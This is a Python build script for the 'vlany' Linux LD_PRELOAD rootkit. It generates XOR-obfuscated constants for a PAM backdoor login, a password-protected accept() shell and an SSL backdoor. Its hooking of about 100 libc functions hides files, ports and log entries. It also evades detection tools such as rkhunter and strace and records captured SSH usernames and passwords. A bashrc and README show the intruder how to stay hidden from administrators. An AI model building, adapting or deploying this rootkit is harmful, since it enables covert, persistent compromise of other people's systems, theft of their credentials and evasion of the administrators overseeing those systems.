#!/usr/bin/python2

import sys

if len(sys.argv) != 16:
    print "Why are you running me from the command line?"
    print "Usage: {0} <install> <lib name> <xattr 1> <xattr 2> <username> <plaintext password> <pam port> <ssl backdoor status> <accept shell password> <low> <high> <execve password> <environ var> <ptrace bug status>".format(sys.argv[0])
    sys.quit() # sys.quit is better than quit or exit

# no need to import anything before now
import random
import string
import crypt

MAGIC_GID = int(''.join(random.choice(string.digits[1:]) for x in range(9))) # string.digits[1:] because we don't want any zeros in the magic gid. fuck that

# so this is more compact than what was previously here, but might be somewhat more difficult to understand,
# but most people don't actually need to understand what's going on here. so...
OPTIONS = [sys.argv[1], sys.argv[2],
           sys.argv[2].split("/")[-1].replace(".x86_64", "").replace(".i686", "").replace(".v6l", ""),
           sys.argv[3], sys.argv[4],
           sys.argv[5], sys.argv[6],
           int(float(sys.argv[7])), sys.argv[9],
           int(float(sys.argv[10])), int(float(sys.argv[11])),
           sys.argv[12].replace(" ", "").replace(";", "").replace("&", ""),
           sys.argv[13].replace(" ", "").replace(";", "").replace("&", ""),
           sys.argv[15]]
INSTALL, LIB_LOCATION, LIB_NAME,\
        HIDDEN_XATTR_1_STR, HIDDEN_XATTR_2_STR,\
        VLANY_USER, VLANY_PASSWORD,\
        PAM_PORT,\
        SHELL_PASSWORD,\
        LOW_PORT, HIGH_PORT,\
        EXECVE_PW, ENV_VAR,\
        LD_PRELOAD =\
        OPTIONS[0], OPTIONS[1], OPTIONS[2], OPTIONS[3],\
        OPTIONS[4], OPTIONS[5], OPTIONS[6], OPTIONS[7],\
        OPTIONS[8], OPTIONS[9], OPTIONS[10], OPTIONS[11],\
        OPTIONS[12], OPTIONS[13]

SSL_BACKDOOR_STAT = int(float(sys.argv[8]))
if SSL_BACKDOOR_STAT == 0:
    SSL_BACKDOOR = False
elif SSL_BACKDOOR_STAT == 1:
    SSL_BACKDOOR = True
else:
    print "Value given for ssl backdoor status (sys.argv[8]) is invalid"
    sys.quit()

PTRACE_BUG_STAT = int(float(sys.argv[14]))
if PTRACE_BUG_STAT == 0:
    PTRACE_BUG = False
elif PTRACE_BUG_STAT == 1:
    PTRACE_BUG = True
else:
    print "Value given for ptrace bug status (sys.argv[14]) is invalid"
    sys.quit()

PTRACE_BUG_MSG = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for x in range(50))
PROC_NET_TCP, PROC_NET_TCP6 = "/proc/net/tcp", "/proc/net/tcp6"
SSL_CIPHER_LIST = "ALL:!ADH:!LOW:!EXP:!MD5:@STRENGTH"

# each line has the names of 4 edited library function names..multiply this by the amount of lines and add on any stragglers
# amount of library functions being hooked = (4 * 22) + 3 = 91
CALLS = ["rename", "renameat", "renameat2", "fread",
         "stat", "stat64", "fstat", "fstat64",
         "fstatat", "fstatat64",
         "lstat", "lstat64", "__lxstat", "__lxstat64",
         "__fxstat", "__fxstat64", "__xstat", "__xstat64",
         "fgets", "fgetflags", "fsetflags",
         "ptrace", "fwrite", "fwrite_unlocked", "fputs_unlocked",
         "execve", "execvp", "link", "linkat",
         "unlink", "unlinkat", "symlink", "symlinkat",
         "mkdir", "mkdirat", "rmdir", "opendir",
         "opendir64", "fdopendir", "readdir", "readdir64",
         "chdir", "fchdir", "access", "open",
         "open64", "fopen", "fopen64", "creat",
         "mkstemp", "accept", "setgid", "setregid",
         "setresgid", "pam_authenticate", "pam_open_session", "pam_acct_mgmt",
         "getpwnam_r", "getpwnam", "getspnam", "getpwuid",
         "kill", "chmod", "chown", "fchmod",
         "fchown", "fchownat", "lchown", "listxattr",
         "llistxattr", "flistxattr", "getxattr", "lgetxattr",
         "fgetxattr", "setxattr", "lsetxattr", "fsetxattr",
         "removexattr", "lremovexattr", "fremovexattr", "audit_log_acct_message",
         "audit_log_user_message", "audit_send", "getutent", "getutxent",
         "pututline", "pcap_loop", "getpwent", "syslog",
         "__syslog_chk", "dladdr", "dlinfo", "dlsym",
         "socket", "login", "setegid", "pututxline",
         "getutid", "getutxid", "getutmp", "getutmpx",
         "updwtmp", "updwtmpx", "getservent", "getservbyname",
         "getservbyport", "mkfifo"]

# the following three lists are just used to hide from dlsym()
# read symbols/hiding/libdl/dlsym.c for hiding functionality in relation to dlsym()
# should i accidentally miss out some hooked library symbols, vlany could be caught out by an admin. if this happens, just add whatever symbol(s) i missed out into this list and it's fixed :p
LIBC_CALLS = ["rename", "renameat", "renameat2", "fread",
             "stat", "stat64", "fstat", "fstat64",
             "fstatat", "fstatat64",
             "lstat", "lstat64", "__lxstat", "__lxstat64",
             "__fxstat", "__fxstat64", "__xstat", "__xstat64",
             "ptrace", "fwrite", "fwrite_unlocked", "fputs_unlocked",
             "fgets", "fgetflags", "fsetflags", # i actually don't know if fgetflags or fsetflags are part of the c library, but i also don't know what library they are part of, so i'm assuming libc
             "execve", "execvp", "link", "linkat",
             "unlink", "unlinkat", "symlink", "symlinkat",
             "mkdir", "mkdirat", "rmdir", "opendir",
             "opendir64", "fdopendir", "readdir", "readdir64",
             "chdir", "fchdir", "access", "open",
             "open64", "fopen", "fopen64", "creat",
             "mkstemp", "accept", "setgid", "setregid",
             "setresgid", "getpwnam_r", "getpwnam", "getspnam",
             "getpwuid", "kill", "chmod", "chown",
             "fchmod", "fchown", "fchownat", "lchown",
             "listxattr", "llistxattr", "flistxattr", "getxattr",
             "lgetxattr", "fgetxattr", "setxattr", "lsetxattr",
             "fsetxattr", "removexattr", "lremovexattr", "fremovexattr",
             "getutent", "getutxent", "pututline", "getpwent",
             "syslog", "__syslog_chk", "socket", "login",
             "setegid", "pututxline", "getutid", "getutxid",
             "getutmp", "getutmpx", "updwtmp", "updwtmpx",
             "getservent", "getservbyname", "getservbyport", "mkfifo"] # return original address for all of these libc functions

LIBDL_CALLS = ["dladdr", "dlinfo", "dlsym"] # we also hook libdl stuff in order to hide modifications to library symbols, so we need to do the same here
LIBPAM_CALLS = ["pam_authenticate", "pam_open_session", "pam_acct_mgmt"] # and the same here...

# GAY_PROCS is a bit of a misnaming. this can also include environment variables :)
GAY_PROCS = ["ldd", "unhide", "rkhunter", "chkproc", "chkdirs", "ltrace", "strace", "LD_AUDIT"]

SHELL_MSG = """
\033[1m
                                  ``
                                  +s/`
                     `..---:/:-`  -oys`     ...`
                    :soo++++/:sy:  /hy`   -ossyyyo:`           ```
                  `+o-``     `:hh/ +hy   /sysydddddo. `-/++oooooss+:-`
                 `shs++os+/:.`.smh:odh:oydddhddhdmmdy+hds+o+-..````.-:--`
               .+hdho-oddmmmmds+mmhommdmmNmNmhhmNNmdmmmdyosyso/-.`
           `-+yhho-`-ydo-+sdmNMNNNNmNmNmmNNdmdyhmdmNNmms-``.-/+osyo:`
         `/ydy+-`  `ydy`  `.:+ydmdmNNsmNmhmmNmmdhmNNmh/`       `.-:+s:
        :yo:-`     +md:       ``.-ysddmddhNNmmNNNNNNmhyso+-.`       -++.
      `+h+`       -dd/            :o/oooydhdyhmNNNmmNNdhyssyhs.       -+/`
     -so.        .hmo`            `s`   -os:``-////smm:````.+hh+.       `::`
    -s:          smy.              .`   +/`        smh.      .+ddo.       ``
  `:/`          -dh:                    `         `hNy         .odh/
  -.            +y.                               .dNo           -/h/
               .yo`                               -mN/             od.
               /y-                                /mm-             .hs
              `s+                                 +dy`              -d-
              .s-                                `oh-                +/
              :+`                                :d+                 .+
              /.                                `yy`                  :
             `+                                 +h-
             --                                .h/
                                               +/
                                              -+
                                             `o`
                                              `

\033[0m"""

pam_consts = ["VLANY_USER", "VLANY_PASSWORD", "PAM_PORT", "VLANY_PERM",
              "HISTFILE", "BASH_RC", "SSH_PASSWORDS", "LOG_FORMAT"]
pam_vals = [VLANY_USER,
            crypt.crypt(VLANY_PASSWORD, "$6${0}".format(''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for x in range(12)))),
            PAM_PORT, "root", "/dev/null", INSTALL + "/.bashrc",
            INSTALL + "/pam_auth_logs", "Username: %s\nPassword: %s\n\n"]

acc_consts = ["SHELL_PASSWORD", "SHELL_NAME", "SHELL_TYPE", "LOGIN"]
acc_vals = [SHELL_PASSWORD, "vlanyrk", "/bin/bash", "--login"]

hid_consts = ["HIDE_FILE", "HIDE_USAGE", "HIDE_SUCCESS",
              "UNHIDE_FILE", "UNHIDE_USAGE", "UNHIDE_SUCCESS"]
hid_vals = ["hide", "The vlany function 'hide' requires a target path to hide in the second argument.\nUsage: ./hide <pass> <path>\n", "\033[32m%s hidden.\033[0m\n",
            "unhide", "The vlany function 'unhide' requires a target path to unhide in the second argument.\nUsage: ./unhide <pass> <path>\n", "\033[32m%s unhidden.\033[0m\n"]

ld_consts = ["LD_LINUX_SO_PATH", "LD_SO_PATH",
             "LD_TRACE_ENV_VAR", "LD_DEBUG_ENV_VAR", "LD_AUDIT_ENV_VAR", "LD_AUDIT_GETENV"]
ld_vals = ["*/*ld-linux*.so.*", "*/*ld-*.so",
           "LD_TRACE_LOADED_OBJECTS=", "LD_DEBUG=", "LD_AUDIT=", "LD_AUDIT"]

proc_consts = ["PROC_NET_TCP", "PROC_NET_TCP6", "PROC_NET_STRING", "PROC_PATH", "PROC_ID"]
proc_vals = [PROC_NET_TCP, PROC_NET_TCP6,
             r"%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n",
             "/proc/", "/proc/%s"]

cc_consts = ["ENV_LINE", "CMD_LINE", "CMDLINE_SELF", "BASH", "_WTMP_FILE", "_UTMP_FILE", "LASTLOG", "FAKE_LASTLOG_FILE"]
cc_vals = ["%s/environ", "%s/cmdline", "/proc/self/cmdline", "/bin/bash --login", "/var/log/wtmp", "/var/run/utmp", "/var/log/lastlog", "/tmp/." + "".join(random.choice(string.digits))]

ssl_consts = ["SSL_CIPHER_LIST", "SUBJECT_ALT_NAME", "NS_COMMENT", "COMMON_NAME", "COMMON_NAME_HOST", "DNS",
              "DEFAULT_KEY_BITS", "DEFAULT_CERT_DURATION", "CERTIFICATE_COMMENT", "DEFAULT_TCP_BUF_LEN", "MAX_LEN"]
ssl_vals = [SSL_CIPHER_LIST, "subjectAltName", "nsComment", "commonName", "localhost", "DNS:",
            1024, (60*60*24*365), "auto", (1024*8), 4125]

def xor(str_):
    return ''.join(list('\\x'+hex(ord(x) ^ 0xac)[2:] for x in str_))

def cindex(call):
    return str(CALLS.index(call))

def write_char_array(array_name, array_size_name, array_list):
    size_def = '\n#define {0} '.format(array_size_name) + str(len(array_list)) + '\n'
    char_array = size_def + 'static char *{0}[{1}] '.format(array_name, array_size_name) + "= {"
    for x in array_list:
        char_array += '"{0}",'.format(xor(x))
    char_array = char_array[:-1] + "};\n"
    return char_array

def write_consts(consts, vals):
    _consts = ""
    for x in consts:
        i = consts.index(x)
        if isinstance(vals[i], int):
            _consts += '#define {0} {1}\n'.format(x, str(vals[i]))
        else:
            _consts += '#define {0} "{1}"\n'.format(x, xor(vals[i]))
    return _consts

def const_h_setup():
    const_h = ""

    if SSL_BACKDOOR == True:
        const_h += "#define SSL_BACKDOOR\n"
    else:
        const_h += "#undef SSL_BACKDOOR\n"

    if PTRACE_BUG == True:
        const_h += "#define PTRACE_BUG\n"
    else:
        const_h += "#undef PTRACE_BUG\n"

    const_h += '#define MAGIC_GID ' + str(MAGIC_GID) + '\n'
    const_h += '#define TERM_ENV_VAR "' + xor("TERM=xterm") + '"\n'

    const_h += write_consts(pam_consts, pam_vals)
    const_h += write_consts(acc_consts, acc_vals)

    const_h += '#define ENV_VAR "' + xor(ENV_VAR) + '"\n'
    const_h += '#define EXECVE_PW "' + xor(EXECVE_PW.replace(" ", "")) + '"\n'
    const_h += '#define TERM "' + xor("TERM=xterm") + '"\n'

    const_h += '#define LIB_NAME "' + xor(LIB_NAME) + '"\n'
    const_h += '#define PTRACE_BUG_MSG "' + xor(PTRACE_BUG_MSG) + '"\n'

    const_h += '#define HIDDEN_XATTR_1_STR "' + xor(HIDDEN_XATTR_1_STR) + '"\n'
    const_h += '#define HIDDEN_XATTR_2_STR "' + xor(HIDDEN_XATTR_2_STR) + '"\n'

    const_h += '#define X_USAGE "' + xor("Usage: %s [pw] [%s] [pkg name]\n") + '"\n' # template string used for snprintf in busage function
    const_h += '#define E_SMSG "' + xor("%s FINISHED AND MAGIC_GID RESET. \033[1;32mWE'RE HIDDEN AGAIN\033[0m\n") + '"\n' # message used after successful command executions
    const_h += '#define GID_SET "' + xor("SETTING GID TO 0\n") + '"\n'

    const_h += '#define XATTR "' + xor("user.%s") + '"\n'

    const_h += write_consts(hid_consts, hid_vals)

    const_h += '#define LIBC_PATH "' + xor("libc.so.6") + '"\n'
    const_h += '#define LIBDL_PATH "' + xor("libdl.so.1") + '"\n'
    const_h += '#define LIBPAM_PATH "' + xor("libpam.so.0") + '"\n'

    const_h += write_consts(ld_consts, ld_vals)

    const_h += '#define HELP "' + xor("help") + '"\n'

    const_h += '#define LD_PRELOAD "' + xor(LD_PRELOAD) + '"\n'
    const_h += '#define LD_PRELOAD_ETC "' + xor(LD_PRELOAD.split("/")[-1]) + '"\n'
    const_h += '#define LD_PRELOAD_ENV "' + xor("LD_PRELOAD") + '"\n'

    const_h += '#define INSTALL "' + xor(INSTALL.split("/")[-1]) + '"\n'
    const_h += '#define INSTALL_DIR "' + xor(INSTALL) + '"\n'
    const_h += '#define LIB_LOCATION "' + xor(LIB_LOCATION) + '"\n'

    const_h += write_consts(proc_consts, proc_vals)

    const_h += '#define MAPS_PATH "' + xor("/proc/%d/maps") + '"\n'
    const_h += '#define FAKEMAPS_FILE "' + xor("/tmp/%d.fakemaps") + '"\n'

    const_h += '#define S_FSIZE 625824\n'

    const_h += write_consts(cc_consts, cc_vals)

    const_h += '#define LOW_PORT ' + str(LOW_PORT) + '\n'
    const_h += '#define HIGH_PORT ' + str(HIGH_PORT) + '\n'

    const_h += write_consts(ssl_consts, ssl_vals)

    for x in CALLS:
        const_h += "#define C{0} {1}\n".format(x.upper(), cindex(x))

    const_h += write_char_array("calls", "_CSIZE", CALLS)
    const_h += write_char_array("libc_calls", "LIBC_SIZE", LIBC_CALLS)
    const_h += write_char_array("libdl_calls", "LIBDL_SIZE", LIBDL_CALLS)
    const_h += write_char_array("libpam_calls", "LIBPAM_SIZE", LIBPAM_CALLS)
    const_h += write_char_array("gay_procs_list", "GPSIZE", GAY_PROCS)

    const_h += """int hidden_ports[] = {""" + str(PAM_PORT) + """,-1};\n"""

    const_h += '#define HOOK(old_sym, sym) if(!old_sym) old_sym = get_symbol(RTLD_NEXT, sym)\n'
    const_h += '#define CLEAN(var) cleanup(var, strlen(var))\n'

    open("symbols/headers/const.h", "w").write(const_h)

def bash_rc_setup():
    bash_rc = """tty -s || return
[ ! -z $TERM ] && export TERM=xterm
unset HISTFILE SAVEHIST TMOUT PROMPT_COMMAND # WE'RE SUPPOSED TO BE INVISIBLE, DAN
[ $(id -u) != 0 ] && su root
[ $(id -u) != 0 ] && kill -9 $$
[ -f "README" ] && cat README | less && rm -f README

clear
cat ~/.shell_msg

PROMPT_COMMAND='PS1="[\\033[1;31m\u@\h\\033[0m:\\033[1;34m\w\\033[0m]$ "'
printf "\\033[1m"; w; echo ""; cat ~/.vlany_information; printf "\\033[0m"

export PATH="~/scripts/:$PATH"

alias ls='ls --color=auto'
alias l=ls
alias ll='ls --color=auto -AlFhn'
alias rm='rm -rfv'
alias nano='nano -ELSit'
alias lsblk='lsblk --fs --all --paths --perms'

alias apt-get='printf "\\033[31mSee the 'scripts' directory\\033[0m\\n"'
alias apt=apt-get
alias yum=apt-get
alias emerge=apt-get
alias pacman=apt-get

alias unchattr='cd {0}; chattr -ia * &>/dev/null; echo "chattr permissions removed on rootkit files"'
alias rechattr='cd {0}; chattr +ia * &>/dev/null; echo "rootkit files chattr permissions reinstated"'

echo -e "\\033[1mLogged account credentials: \\033[1;31m$(grep Username ~/pam_auth_logs 2>/dev/null | wc -l)\\033[0m"
[ ! -z "`which shred`" ] && alias vshred='shred -n 5 --random-source=/dev/urandom -uvz'
echo "Use 'alias' to view list of all bash aliases."

# you're on your own now...
"""
    fd = open("bashrc", "w")
    fd.write(bash_rc.format(INSTALL))
    fd.close()

    fd = open("shell_msg", "w")
    fd.write(SHELL_MSG)
    fd.close()

    # removed special ascii from readme
    BD_README = """If you're reading this, then you've successfully logged into your PAM backdoor and you are in an owner shell.
DO NOT unalias apt-get and attempt to install a package via the standard package manager on this box. EVERYTHING WILL GO TO RUIN.
There's a directory named 'scripts' with python scripts designed to assume the status of a normal process and execute something normally until the desired process is finished.
Be careful if you're going to do something potentially dumb.
(The switch from GID based file hiding to extended attributes fixed this, but package managers still will not work. Nothing will be ruined, but package managers will not work, and file modifications are apparent.)

**FILE HIDING/PROTECTION**:
  FILES OR DIRECTORIES CREATED IN THIS SHELL AREN'T HIDDEN DYNAMICALLY DUE TO THE NEW FILE HIDING BY EXTENDED ATTRIBUTES.
  ONCE YOU CREATE NEW FILES OR DIRECTORIES, YOU MUST ISSUE THE ./hide COMMAND ON THE NEWLY CREATED FILES/DIRECTORIES TO
  PROTECT THEM FROM REGULAR USERS. THIS IS VERY IMPORTANT. DO NOT FORGET THIS.
  p.s.: you can also use ./unhide to... ya, unhide files & directories. also, your home directory is already hidden... so
        just do everything in here.

Python unhiding scripts:
  So they're quite simple, around 30 lines, very easily copyable and configurable to do whatever it is you want.
  By default, there's 3 scripts for using package managers normally (apt.py, pacman.py & yum.py), and vlany.py, which just helps in terms of efficacy.
  But let me make it clear... Whatever you execute using these scripts is completely visible to userland - everyone can see it. Suspicions may be arisen.

Rootkit shared object file:
  This is located in your hidden directory. DO NOT remove it. If you do, ld will throw a shit bunch of errors everyone's way. That's bad.
  By default, install.sh makes the shared object file unremovable. If you run 'unchattr', you'll be able to remove it.

vlany LXC container:
  There's a file called enter_lxc.c in your home directory. It allows for on-the-fly creation and destruction of hidden container environments.
  Since you'll be running the binary from a hidden owner shell, the file system and any log files pertaining to the hidden container will be completely hidden from regular users.
  THIS NOW DOES NOT APPLY AS OF June 2nd 2016, SINCE VLANY USES EXTENDED ATTRIBUTES TO HIDE FILES NOW. FILE HIDING VIA EXTENDED ATTRIBUTES ISN'T DYNAMIC IN THE SAME WAY THAT GID BASED
  FILE HIDING IS.
  To compile this utility, make sure you have the lxc header files installed, usually in a package called lxc-dev or something similar. Once you've verified this, use gcc and remember
  to link liblxc when compiling.
  The binary takes one argument - a container name - to run.
  Literal usage:
    gcc enter_lxc.c -llxc -o enter_lxc
    ./enter_lxc VLANY_CONTAINER
  Remember that this container is temporary and will be destroyed once you type 'exit'.
  If somebody (not you) is monitoring disk usage of this box, they will notice that the disk usage will increase when you're in a container. The disk usage will go back to normal once you
  exit the container. It's not like this will get us caught, but it might look a little strange to some paranoid admins.

pce,
press q to quit, this will not show again after this"""

    fd = open("bd_readme", "w")
    fd.write(BD_README)
    fd.close()

# hm
def main():
    const_h_setup()
    bash_rc_setup()

    fd = open("magic_gid", "w")
    fd.write(str(MAGIC_GID))
    fd.close()

    sys.stdout.write("success")

if __name__ == "__main__":
    main()
